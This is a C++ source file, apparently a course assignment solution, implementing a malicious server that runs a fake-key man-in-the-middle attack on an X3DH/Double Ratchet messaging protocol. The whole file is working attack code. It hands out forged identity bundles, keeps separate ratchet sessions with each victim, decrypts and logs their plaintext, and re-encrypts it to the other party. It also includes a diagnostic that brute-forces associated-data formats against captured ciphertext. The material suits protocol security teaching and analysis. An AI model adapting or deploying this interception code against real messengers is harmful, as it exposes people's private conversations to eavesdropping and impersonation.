// attack2.cpp -- Malicious server performing a fake-key MITM on X3DH/Double Ratchet
//
// Scenario (assignment_pdf.pdf, Attack 2): the messaging server itself is
// malicious. It cannot forge valid AEAD ciphertext without the right
// message keys, but X3DH's root of trust for IDENTITY KEYS is exactly
// "whatever the server hands you in fetch_bundle" (protocol.md section 3):
// there is no CA, no TOFU pinning persisted client-side across fetches,
// and no out-of-band fingerprint/safety-number comparison in the
// protocol. So the server can simply:
//
//   1. Hand Alice a bundle for "bob" that uses a key pair THE SERVER
//      generated, not Bob's real key pair.
//   2. Hand Bob (when the server itself forges the first message "from"
//      Alice) a fake "alice" identity the server generated, run against
//      Bob's REAL published bundle.
//
// This program replaces as3_server entirely (point both clients at it:
//   docker compose run --rm bob   --serve-addr <attacker_ip> --port <P>
//   docker compose run --rm alice --serve-addr <attacker_ip> --port <P>
// ) and implements the full server-side protocol (register/publish/
// fetch_bundle/send/poll, protocol.md section 2.4) PLUS, on every "send",
// transparently decrypts with the session it holds toward the real sender
// and re-encrypts with a second, independent session it holds toward the
// real recipient -- two separate Double Ratchet sessions, each one
// genuinely valid X3DH/DR crypto, just anchored on identity keys the
// attacker, not the victim, generated.
//
// ASSUMPTION (same one flagged in common/crypto.hpp, repeated here because
// it's load-bearing for this attack specifically): the exact bytes of
// `serialize(header)` used as AEAD associated data are not given in
// protocol.md. This code assumes compact JSON with keys in declaration
// order (dh, pn, n[, init]) -- the natural output of Go's encoding/json
// for a struct with fields in that order. If the real client's AD differs,
// every decrypt/encrypt here will still be internally self-consistent
// (both ends of a given forged session are code in this file), but this
// program's decryption of the REAL Alice/Bob ciphertext, and the real
// clients' decryption of frames this program forges, both depend on
// matching the real binary's exact AD bytes. Verify with a capture
// (tshark -i any -f "tcp port <P>" -T fields -e tcp.payload) and adjust
// headerAD() below if the wire format differs.
//
// Build: see README.md / Makefile.

#include "common/json_mini.hpp"
#include "common/netutil.hpp"
#include "common/crypto.hpp"
#include <cstdio>
#include <cstring>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <stdexcept>

using json::Value;
using crypto::Bytes;

static const size_t MAX_SKIP = 1000;

// ---------------- identity / bundle bookkeeping ----------------

struct OpkEntry { long id; crypto::X25519KeyPair kp; };

// An identity the ATTACKER generated to impersonate some username, either
// when answering fetch_bundle(username) for someone else, or when forging
// the first message of a session claiming to BE username.
struct FakeIdentity {
    crypto::Ed25519KeyPair sig;
    crypto::X25519KeyPair dh;
    crypto::X25519KeyPair spk;
    Bytes spkSig;
    std::vector<OpkEntry> opks;
    long nextOpkId = 1;
    long opkCursor = 0;

    static FakeIdentity generate(int opkCount = 10) {
        FakeIdentity fi;
        fi.sig = crypto::ed25519Generate();
        fi.dh = crypto::x25519Generate();
        fi.spk = crypto::x25519Generate();
        fi.spkSig = crypto::ed25519Sign(fi.sig.priv, fi.spk.pub);
        for (int i = 0; i < opkCount; i++) {
            OpkEntry e;
            e.id = fi.nextOpkId++;
            e.kp = crypto::x25519Generate();
            fi.opks.push_back(e);
        }
        return fi;
    }

    bool takeOpk(long& outId, crypto::X25519KeyPair& outKp) {
        if (opkCursor >= (long)opks.size()) return false;
        outId = opks[opkCursor].id;
        outKp = opks[opkCursor].kp;
        opkCursor++;
        return true;
    }
};

// The REAL bundle a genuine client published to us via "publish".
struct RealBundle {
    bool present = false;
    Bytes ikSig, ikDh, spk, spkSig;
    struct RealOpk { long id; Bytes pub; };
    std::vector<RealOpk> opks;
    size_t cursor = 0;

    bool takeOpk(long& outId, Bytes& outPub) {
        if (cursor >= opks.size()) return false;
        outId = opks[cursor].id;
        outPub = opks[cursor].pub;
        cursor++;
        return true;
    }
};

// ---------------- Double Ratchet state (protocol.md section 4) ----------------

struct RatchetState {
    Bytes RK, AD;
    crypto::X25519KeyPair DHs;
    Bytes DHr;             // empty == None
    bool hasDHr = false;
    Bytes CKs, CKr;
    bool hasCKs = false, hasCKr = false;
    long Ns = 0, Nr = 0, PN = 0;
    std::map<std::string, Bytes> skipped; // key: dh_b64 + "|" + n
};

static Value headerJson(const std::string& dhB64, long pn, long n, const Value* initBlock) {
    Value h = Value::mkObj();
    h.set("dh", Value::mkStr(dhB64));
    h.set("pn", Value::mkNum((double)pn));
    h.set("n", Value::mkNum((double)n));
    if (initBlock) h.set("init", *initBlock);
    return h;
}

// AEAD associated data = AD || serialize(header). protocol.md 4.3's
// ratchet_encrypt pseudocode builds the AD-covered header as exactly
// {"dh","pn","n"} -- "init" is part of the wire envelope (added for session
// bootstrapping) but is NOT one of the three fields serialized into the AD.
// Strip it here even if the caller's header value carries it, so the AD we
// compute matches what the real client signs regardless of whether "init"
// is present on this particular message.
static Bytes headerAD(const Bytes& sessionAD, const Value& header) {
    Value adHeader = Value::mkObj();
    adHeader.set("dh", json::Value::mkStr(header.getStr("dh")));
    adHeader.set("pn", json::Value::mkNum((double)header.getInt("pn")));
    adHeader.set("n", json::Value::mkNum((double)header.getInt("n")));
    std::string s = json::dump(adHeader);
    Bytes out = sessionAD;
    out.insert(out.end(), s.begin(), s.end());
    return out;
}

static RatchetState ratchetInitSender(const Bytes& sk, const Bytes& theirSpk, const Bytes& ad) {
    RatchetState st;
    st.RK = sk;
    st.AD = ad;
    st.DHr = theirSpk;
    st.hasDHr = true;
    st.DHs = crypto::x25519Generate();
    auto step = crypto::kdfRk(st.RK, crypto::x25519(st.DHs.priv, theirSpk));
    st.RK = step.rk;
    st.CKs = step.ck;
    st.hasCKs = true;
    return st;
}

static RatchetState ratchetInitReceiver(const Bytes& sk, const crypto::X25519KeyPair& mySpk, const Bytes& ad) {
    RatchetState st;
    st.RK = sk;
    st.AD = ad;
    st.DHs = mySpk;
    // DHr stays unset (None); CKs/CKr stay unset until the first DH ratchet.
    return st;
}

static void dhRatchet(RatchetState& st, const Bytes& theirNewDh) {
    st.PN = st.Ns;
    st.Ns = 0;
    st.Nr = 0;
    st.DHr = theirNewDh;
    st.hasDHr = true;
    auto step1 = crypto::kdfRk(st.RK, crypto::x25519(st.DHs.priv, st.DHr));
    st.RK = step1.rk;
    st.CKr = step1.ck;
    st.hasCKr = true;
    st.DHs = crypto::x25519Generate();
    auto step2 = crypto::kdfRk(st.RK, crypto::x25519(st.DHs.priv, st.DHr));
    st.RK = step2.rk;
    st.CKs = step2.ck;
    st.hasCKs = true;
}

static void skipMessageKeys(RatchetState& st, long until, const std::string& dhB64) {
    if (!st.hasCKr) return;
    if (until - st.Nr > (long)MAX_SKIP) throw std::runtime_error("too many skipped messages");
    while (st.Nr < until) {
        auto step = crypto::kdfCk(st.CKr);
        st.skipped[dhB64 + "|" + std::to_string(st.Nr)] = step.mk;
        st.CKr = step.ck;
        st.Nr++;
    }
}

struct EncryptResult { Value header; Bytes ct; };

static EncryptResult ratchetEncrypt(RatchetState& st, const Bytes& plaintext, const Value* initBlock) {
    auto step = crypto::kdfCk(st.CKs);
    Bytes mk = step.mk;
    st.CKs = step.ck;
    std::string dhB64 = crypto::toB64(st.DHs.pub);
    Value header = headerJson(dhB64, st.PN, st.Ns, initBlock);
    st.Ns++;
    Bytes ad = headerAD(st.AD, header);
    Bytes ct = crypto::chachaEncrypt(mk, plaintext, ad);
    return { header, ct };
}

// Returns false if authentication failed (session state up to the AEAD
// check is still mutated first -- intentionally mirrors protocol.md 4.4 so
// attack0's resource-exhaustion argument and this server's decrypt share
// one implementation).
static bool ratchetDecrypt(RatchetState& st, const Value& header, const Bytes& ct, Bytes& outPlaintext) {
    std::string dhB64 = header.getStr("dh");
    long pn = header.getInt("pn");
    long n = header.getInt("n");

    std::string skey = dhB64 + "|" + std::to_string(n);
    auto it = st.skipped.find(skey);
    if (it != st.skipped.end()) {
        Bytes mk = it->second;
        st.skipped.erase(it);
        Bytes ad = headerAD(st.AD, header);
        return crypto::chachaDecrypt(mk, ct, ad, outPlaintext);
    }

    Bytes newDh = crypto::fromB64(dhB64);
    if (!st.hasDHr || newDh != st.DHr) {
        skipMessageKeys(st, pn, crypto::toB64(st.DHr));
        dhRatchet(st, newDh);
    }
    skipMessageKeys(st, n, dhB64);

    auto step = crypto::kdfCk(st.CKr);
    Bytes mk = step.mk;
    st.CKr = step.ck;
    st.Nr++;

    Bytes ad = headerAD(st.AD, header);
    return crypto::chachaDecrypt(mk, ct, ad, outPlaintext);
}

// ---------------- X3DH (protocol.md section 3) ----------------

struct X3dhInitResult { RatchetState state; Value init; };

static X3dhInitResult x3dhInitiate(const FakeIdentity& myId, const RealBundle& bundle) {
    if (!crypto::ed25519Verify(bundle.ikSig, bundle.spk, bundle.spkSig)) {
        throw std::runtime_error("real bundle's spk signature does not verify -- cannot forge toward this peer");
    }
    auto ek = crypto::x25519Generate();
    Bytes dh1 = crypto::x25519(myId.dh.priv, bundle.spk);
    Bytes dh2 = crypto::x25519(ek.priv, bundle.ikDh);
    Bytes dh3 = crypto::x25519(ek.priv, bundle.spk);

    Bytes ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
    ikm.insert(ikm.end(), dh3.begin(), dh3.end());

    long opkId = 0;
    Bytes opkPub;
    bool haveOpk = const_cast<RealBundle&>(bundle).takeOpk(opkId, opkPub);
    if (haveOpk) {
        Bytes dh4 = crypto::x25519(ek.priv, opkPub);
        ikm.insert(ikm.end(), dh4.begin(), dh4.end());
    }

    Bytes salt(32, 0);
    Bytes sk = crypto::hkdfSha256(salt, ikm, crypto::fromStr(crypto::INFO_X3DH), 32);

    Bytes ad = myId.dh.pub;
    ad.insert(ad.end(), bundle.ikDh.begin(), bundle.ikDh.end());

    Value init = Value::mkObj();
    init.set("ik_sig", Value::mkStr(crypto::toB64(myId.sig.pub)));
    init.set("ik_dh", Value::mkStr(crypto::toB64(myId.dh.pub)));
    init.set("ek", Value::mkStr(crypto::toB64(ek.pub)));
    init.set("opk_id", Value::mkNum((double)opkId));

    RatchetState st = ratchetInitSender(sk, bundle.spk, ad);
    return { st, init };
}

static RatchetState x3dhRespond(const FakeIdentity& myId, const Value& init) {
    Bytes initIkDh = crypto::fromB64(init.getStr("ik_dh"));
    Bytes initEk = crypto::fromB64(init.getStr("ek"));
    long opkId = init.getInt("opk_id", 0);

    Bytes dh1 = crypto::x25519(myId.spk.priv, initIkDh);
    Bytes dh2 = crypto::x25519(myId.dh.priv, initEk);
    Bytes dh3 = crypto::x25519(myId.spk.priv, initEk);

    Bytes ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
    ikm.insert(ikm.end(), dh3.begin(), dh3.end());

    if (opkId != 0) {
        crypto::X25519KeyPair myOpk;
        bool found = false;
        for (auto& e : myId.opks) if (e.id == opkId) { myOpk = e.kp; found = true; break; }
        if (found) {
            Bytes dh4 = crypto::x25519(myOpk.priv, initEk);
            ikm.insert(ikm.end(), dh4.begin(), dh4.end());
        }
    }

    Bytes salt(32, 0);
    Bytes sk = crypto::hkdfSha256(salt, ikm, crypto::fromStr(crypto::INFO_X3DH), 32);

    Bytes ad = initIkDh;
    ad.insert(ad.end(), myId.dh.pub.begin(), myId.dh.pub.end());

    return ratchetInitReceiver(sk, myId.spk, ad);
}

// ---------------- the malicious server ----------------

class MaliciousServer {
public:
    std::mutex mu;
    std::map<std::string, RealBundle> realBundles;      // username -> what they genuinely published
    std::map<std::string, FakeIdentity> fakeIdentities;  // username -> identity we forged to BE them
    std::map<std::string, RatchetState> sessions;        // username -> our session WITH that real human
    std::map<std::string, std::vector<Value>> mailbox;   // username -> queued frames awaiting poll

    FakeIdentity& fakeIdentityFor(const std::string& user) {
        auto it = fakeIdentities.find(user);
        if (it != fakeIdentities.end()) return it->second;
        fprintf(stderr, "[evil-server] forging a fresh identity to impersonate '%s'\n", user.c_str());
        auto res = fakeIdentities.emplace(user, FakeIdentity::generate());
        return res.first->second;
    }

    // Temporary diagnostic: the real client's first message of a session is
    // failing AEAD verification against our X3DH-derived key. Recompute SK
    // independently and brute-force several plausible AD/header hypotheses
    // against the actual ciphertext to pin down which one the real client
    // actually uses, instead of guessing blind from protocol.md's pseudocode.
    void diagnoseFirstMessage(const FakeIdentity& myId, const Value& initBlock,
                               const Value& header, const Bytes& ct) {
        Bytes initIkDh = crypto::fromB64(initBlock.getStr("ik_dh"));
        Bytes initEk = crypto::fromB64(initBlock.getStr("ek"));
        long opkId = initBlock.getInt("opk_id", 0);

        Bytes dh1 = crypto::x25519(myId.spk.priv, initIkDh);
        Bytes dh2 = crypto::x25519(myId.dh.priv, initEk);
        Bytes dh3 = crypto::x25519(myId.spk.priv, initEk);
        Bytes ikm(32, 0xFF);
        ikm.insert(ikm.end(), dh1.begin(), dh1.end());
        ikm.insert(ikm.end(), dh2.begin(), dh2.end());
        ikm.insert(ikm.end(), dh3.begin(), dh3.end());
        if (opkId != 0) {
            for (auto& e : myId.opks) if (e.id == opkId) {
                Bytes dh4 = crypto::x25519(e.kp.priv, initEk);
                ikm.insert(ikm.end(), dh4.begin(), dh4.end());
                break;
            }
        }
        Bytes salt(32, 0);
        Bytes sk = crypto::hkdfSha256(salt, ikm, crypto::fromStr(crypto::INFO_X3DH), 32);

        Bytes dhOut = crypto::x25519(myId.spk.priv, crypto::fromB64(header.getStr("dh")));
        auto step1 = crypto::kdfRk(sk, dhOut);
        Bytes ck = step1.ck;
        auto chain = crypto::kdfCk(ck);
        Bytes mk = chain.mk;

        Bytes sessionAdFwd = initIkDh; sessionAdFwd.insert(sessionAdFwd.end(), myId.dh.pub.begin(), myId.dh.pub.end());
        Bytes sessionAdRev = myId.dh.pub; sessionAdRev.insert(sessionAdRev.end(), initIkDh.begin(), initIkDh.end());

        Value adHeaderNoInit = Value::mkObj();
        adHeaderNoInit.set("dh", Value::mkStr(header.getStr("dh")));
        adHeaderNoInit.set("pn", Value::mkNum((double)header.getInt("pn")));
        adHeaderNoInit.set("n", Value::mkNum((double)header.getInt("n")));
        std::string hNoInit = json::dump(adHeaderNoInit);
        std::string hWithInit = json::dump(header);

        struct Cand { const char* name; Bytes ad; };
        std::vector<Cand> cands;
        auto mk_ad = [](Bytes prefix, const std::string& s) { Bytes b = prefix; b.insert(b.end(), s.begin(), s.end()); return b; };
        cands.push_back({"sessionAdFwd + {dh,pn,n}",        mk_ad(sessionAdFwd, hNoInit)});
        cands.push_back({"sessionAdFwd + {dh,pn,n,init}",   mk_ad(sessionAdFwd, hWithInit)});
        cands.push_back({"sessionAdRev + {dh,pn,n}",        mk_ad(sessionAdRev, hNoInit)});
        cands.push_back({"sessionAdRev + {dh,pn,n,init}",   mk_ad(sessionAdRev, hWithInit)});
        cands.push_back({"sessionAdFwd only",               sessionAdFwd});
        cands.push_back({"{dh,pn,n} only",                  Bytes(hNoInit.begin(), hNoInit.end())});
        cands.push_back({"{dh,pn,n,init} only",             Bytes(hWithInit.begin(), hWithInit.end())});
        cands.push_back({"empty AD",                        Bytes()});

        fprintf(stderr, "[evil-server][diag] trying %zu AD hypotheses against this ciphertext...\n", cands.size());
        bool any = false;
        for (auto& c : cands) {
            Bytes pt;
            bool ok = crypto::chachaDecrypt(mk, ct, c.ad, pt);
            fprintf(stderr, "[evil-server][diag]   %-28s -> %s%s\n", c.name, ok ? "SUCCESS: " : "fail",
                    ok ? std::string(pt.begin(), pt.end()).c_str() : "");
            if (ok) any = true;
        }
        if (!any) {
            fprintf(stderr, "[evil-server][diag] none of the AD hypotheses worked -- "
                             "the mismatch is upstream of AD (SK/DH computation itself).\n");
        }
    }

    Value handleRegister(const std::string& user) {
        fprintf(stderr, "[evil-server] %s registered\n", user.c_str());
        Value r = Value::mkObj();
        r.set("type", Value::mkStr("ok"));
        r.set("ok", Value::mkBool(true));
        return r;
    }

    Value handlePublish(const std::string& user, const Value& req) {
        std::lock_guard<std::mutex> lk(mu);
        auto* bundle = req.find("bundle");
        RealBundle rb;
        rb.present = true;
        if (bundle) {
            rb.ikSig = crypto::fromB64(bundle->getStr("ik_sig"));
            rb.ikDh = crypto::fromB64(bundle->getStr("ik_dh"));
            rb.spk = crypto::fromB64(bundle->getStr("spk"));
            rb.spkSig = crypto::fromB64(bundle->getStr("spk_sig"));
        }
        auto* opks = req.find("opks");
        if (opks && opks->type == json::Type::Array) {
            for (auto& e : opks->arr) {
                RealBundle::RealOpk o;
                o.id = e.getInt("id");
                o.pub = crypto::fromB64(e.getStr("pub"));
                rb.opks.push_back(o);
            }
        }
        realBundles[user] = rb;
        fprintf(stderr, "[evil-server] %s published a REAL bundle with %zu one-time prekeys "
                        "(their true identity key -- we will NOT hand this out)\n",
                user.c_str(), rb.opks.size());
        Value r = Value::mkObj();
        r.set("type", Value::mkStr("ok"));
        r.set("ok", Value::mkBool(true));
        r.set("count", Value::mkNum((double)rb.opks.size()));
        return r;
    }

    Value handleFetchBundle(const std::string& requester, const std::string& target) {
        std::lock_guard<std::mutex> lk(mu);
        FakeIdentity& fi = fakeIdentityFor(target);
        long opkId = 0;
        crypto::X25519KeyPair opkKp;
        bool haveOpk = fi.takeOpk(opkId, opkKp);

        Value bundle = Value::mkObj();
        bundle.set("user", Value::mkStr(target));
        bundle.set("ik_sig", Value::mkStr(crypto::toB64(fi.sig.pub)));
        bundle.set("ik_dh", Value::mkStr(crypto::toB64(fi.dh.pub)));
        bundle.set("spk", Value::mkStr(crypto::toB64(fi.spk.pub)));
        bundle.set("spk_sig", Value::mkStr(crypto::toB64(fi.spkSig)));
        bundle.set("opk", Value::mkStr(haveOpk ? crypto::toB64(opkKp.pub) : ""));
        bundle.set("opk_id", Value::mkNum((double)(haveOpk ? opkId : 0)));

        fprintf(stderr, "[evil-server] %s fetched a bundle for '%s' -- served the FORGED identity "
                        "instead of %s's real one (fake-key / MITM substitution)\n",
                requester.c_str(), target.c_str(), target.c_str());

        Value r = Value::mkObj();
        r.set("type", Value::mkStr("bundle"));
        r.set("ok", Value::mkBool(true));
        r.set("bundle", bundle);
        r.set("count", Value::mkNum((double)(fi.opks.size() - fi.opkCursor)));
        return r;
    }

    // Returns the response to send back to the original sender.
    Value handleSend(const Value& frame) {
        std::lock_guard<std::mutex> lk(mu);
        std::string from = frame.getStr("from");
        std::string to = frame.getStr("to");
        auto* header = frame.find("header");
        auto* ctB64 = frame.find("ct");
        if (!header || !ctB64) {
            Value r = Value::mkObj(); r.set("type", Value::mkStr("err")); r.set("err", Value::mkStr("bad frame"));
            return r;
        }
        Bytes ct = crypto::fromB64(ctB64->str);

        // --- 1. decrypt with our session toward the real sender ---
        auto sIt = sessions.find(from);
        if (sIt == sessions.end()) {
            auto* initBlock = header->find("init");
            if (!initBlock) {
                fprintf(stderr, "[evil-server] %s -> %s: no session and no init block, cannot decrypt; dropping\n",
                        from.c_str(), to.c_str());
                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
            }
            FakeIdentity& myFakeSelf = fakeIdentityFor(to); // identity we handed out as "to"
            RatchetState st = x3dhRespond(myFakeSelf, *initBlock);
            sIt = sessions.emplace(from, std::move(st)).first;
            fprintf(stderr, "[evil-server] established session with REAL %s, posing as %s\n", from.c_str(), to.c_str());
        }

        Bytes plaintext;
        bool ok = ratchetDecrypt(sIt->second, *header, ct, plaintext);
        if (!ok) {
            fprintf(stderr, "[evil-server] %s -> %s: AEAD authentication FAILED -- cannot recover plaintext "
                            "(forwarding opaque ciphertext unchanged)\n", from.c_str(), to.c_str());
            if (header->find("init")) {
                diagnoseFirstMessage(fakeIdentityFor(to), *header->find("init"), *header, ct);
            }
            std::lock_guard<std::mutex> lk2(mu);
            mailbox[to].push_back(frame);
            Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
        }

        std::string plaintextStr(plaintext.begin(), plaintext.end());
        fprintf(stderr, "[evil-server] *** RECOVERED PLAINTEXT *** %s -> %s : \"%s\"\n",
                from.c_str(), to.c_str(), plaintextStr.c_str());

        // --- 2. re-encrypt with our (separate) session toward the real recipient ---
        auto dIt = sessions.find(to);
        Value initOut;
        bool attachInit = false;
        if (dIt == sessions.end()) {
            auto rbIt = realBundles.find(to);
            if (rbIt == realBundles.end() || !rbIt->second.present) {
                fprintf(stderr, "[evil-server] %s has not published a bundle yet -- cannot forge a session "
                                "toward them; dropping message (plaintext was still recovered above)\n", to.c_str());
                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
            }
            FakeIdentity& myFakeAsFrom = fakeIdentityFor(from); // identity we present as "from"
            auto res = x3dhInitiate(myFakeAsFrom, rbIt->second);
            dIt = sessions.emplace(to, std::move(res.state)).first;
            initOut = res.init;
            attachInit = true;
            fprintf(stderr, "[evil-server] established session with REAL %s, posing as %s\n", to.c_str(), from.c_str());
        }

        auto enc = ratchetEncrypt(dIt->second, plaintext, attachInit ? &initOut : nullptr);

        Value fwdFrame = Value::mkObj();
        fwdFrame.set("from", Value::mkStr(from));
        fwdFrame.set("to", Value::mkStr(to));
        fwdFrame.set("header", enc.header);
        fwdFrame.set("ct", Value::mkStr(crypto::toB64(enc.ct)));
        mailbox[to].push_back(fwdFrame);

        Value r = Value::mkObj();
        r.set("type", Value::mkStr("ok"));
        r.set("ok", Value::mkBool(true));
        return r;
    }

    Value handlePoll(const std::string& user) {
        std::lock_guard<std::mutex> lk(mu);
        Value r = Value::mkObj();
        r.set("type", Value::mkStr("frames"));
        r.set("ok", Value::mkBool(true));
        Value arr = Value::mkArr();
        for (auto& f : mailbox[user]) arr.arr.push_back(f);
        r.set("frames", arr);
        mailbox[user].clear();
        return r;
    }
};

static void handleClient(int fd, MaliciousServer* server) {
    net::LineReader reader(fd);
    std::string user;
    std::string line;
    try {
        while (reader.readLine(line)) {
            fprintf(stderr, "[evil-server][debug] raw line in : %s\n", line.c_str());
            Value req = json::parse(line);
            std::string type = req.getStr("type");
            Value resp;
            if (type == "register") {
                user = req.getStr("user");
                resp = server->handleRegister(user);
            } else if (type == "publish") {
                resp = server->handlePublish(req.getStr("user"), req);
            } else if (type == "fetch_bundle") {
                resp = server->handleFetchBundle(user, req.getStr("user"));
            } else if (type == "send") {
                auto* frame = req.find("frame");
                resp = frame ? server->handleSend(*frame) : Value::mkObj();
                if (!frame) { resp.set("type", Value::mkStr("err")); resp.set("err", Value::mkStr("missing frame")); }
            } else if (type == "poll") {
                resp = server->handlePoll(req.getStr("user"));
            } else {
                resp = Value::mkObj();
                resp.set("type", Value::mkStr("err"));
                resp.set("err", Value::mkStr("unknown type"));
            }
            std::string respStr = json::dump(resp);
            fprintf(stderr, "[evil-server][debug] raw line out: %s\n", respStr.c_str());
            net::sendLine(fd, respStr);
        }
    } catch (std::exception& e) {
        fprintf(stderr, "[evil-server] connection for '%s' error: %s\n", user.c_str(), e.what());
    }
    close(fd);
    fprintf(stderr, "[evil-server] connection for '%s' closed\n", user.c_str());
}

int main(int argc, char** argv) {
    std::string listenAddr = "0.0.0.0";
    int listenPort = 9000;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto val = [&](int& i) { return std::string(argv[++i]); };
        if (a == "--listen-addr") listenAddr = val(i);
        else if (a == "--listen-port") listenPort = std::stoi(val(i));
        else if (a == "--help") { printf("usage: attack2 [--listen-addr A] [--listen-port P]\n"); return 0; }
    }

    MaliciousServer server;
    int listenFd;
    try {
        listenFd = net::listenOn(listenAddr, listenPort);
    } catch (std::exception& e) {
        fprintf(stderr, "fatal: %s\n", e.what());
        return 1;
    }
    fprintf(stderr,
            "[evil-server] malicious AS3 server listening on %s:%d\n"
            "[evil-server] point both clients here instead of the real server:\n"
            "  docker compose run --rm bob   --serve-addr <attacker_ip> --port %d\n"
            "  docker compose run --rm alice --serve-addr <attacker_ip> --port %d\n",
            listenAddr.c_str(), listenPort, listenPort, listenPort);

    while (true) {
        sockaddr_in cliAddr{};
        socklen_t len = sizeof(cliAddr);
        int clientFd = accept(listenFd, (sockaddr*)&cliAddr, &len);
        if (clientFd < 0) continue;
        std::thread(handleClient, clientFd, &server).detach();
    }
    return 0;
}
